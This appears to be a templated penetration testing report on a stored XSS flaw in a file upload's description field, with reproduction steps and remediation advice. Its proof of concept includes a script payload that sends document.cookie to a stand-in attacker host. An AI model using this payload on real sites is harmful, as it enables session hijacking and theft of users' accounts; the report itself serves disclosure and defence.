# Penetration Testing Writeup: XSS in File Upload

## Executive Summary

A Stored Cross-Site Scripting (XSS) vulnerability was found in [Target
Application]’s file upload feature, allowing attackers to embed scripts in
uploaded file metadata. This report details the vulnerability and remediation
steps.

## Vulnerability Details

- **Vulnerability Type**: Cross-Site Scripting (XSS) - Stored
- **Severity**: Critical
- **Affected Component**: File upload metadata display
- **CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)
- **Location**: `https://[target-application]/files`
- **Discovered By**: [PenTester Name]
- **Date Discovered**: August 30, 2025

### Description

The file upload feature does not sanitize metadata (e.g., file descriptions)
before storing and displaying them, allowing script execution.

### Impact

- **Session Theft**: Cookies can be stolen.
- **Phishing**: Fake forms can capture credentials.
- **Data Leakage**: File metadata can be exfiltrated.
- **Defacement**: Page content can be altered.

### Proof of Concept

1. Upload a file with description: `<script>alert('Stored XSS');</script>`.
2. View the file list and observe the alert.
3. Malicious payload:
   `<script>fetch('https://attacker.com/steal?cookie='+document.cookie);</script>`.

### Steps to Reproduce

1. Navigate to `https://[target-application]/files`.
2. Upload a file with description `<script>alert('Stored XSS');</script>`.
3. View the file list to confirm the alert.

## Remediation Recommendations

1. **Input Sanitization**:
   - Sanitize file metadata using OWASP AntiSamy.
2. **Output Encoding**:
   - Encode metadata before rendering.
3. **Content Security Policy**:
   - Use CSP: `Content-Security-Policy: script-src 'self';`.
4. **Secure Coding**:
   - Train developers on XSS prevention.
5. **Security Testing**:
   - Conduct regular audits.

## Conclusion

The Stored XSS vulnerability in [Target Application]’s file upload feature
requires urgent remediation.

## References

- OWASP XSS Prevention Cheat Sheet:
  https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- CWE-79: https://cwe.mitre.org/data/definitions/79.html

![File XSS Example](https://example.com/images/file-xss-example.png)
